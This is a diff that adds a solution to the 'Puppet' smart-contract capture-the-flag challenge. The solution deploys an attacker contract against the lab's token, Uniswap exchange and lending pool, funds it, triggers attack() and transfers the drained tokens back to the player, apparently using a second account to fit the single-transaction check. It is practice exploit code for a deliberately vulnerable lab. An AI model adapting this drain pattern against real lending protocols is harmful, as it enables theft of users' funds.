@@ -95,10 +95,24 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        [,,this.player2] = await ethers.getSigners();
+
+
+        const AttackerContractFactory = await ethers.getContractFactory('AttackPuppet', this.player2);
+        this.attackerContract = await AttackerContractFactory.deploy(
+            token.address, uniswapExchange.address, lendingPool.address
+        )
+
+        token.connect(player).transfer(this.attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await this.attackerContract.attack({value: 11n * 10n ** 18n});
+        await token.connect(this.player2).transfer(player.address, await token.balanceOf(this.player2.address));
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
         // Player executed a single transaction
         expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
         
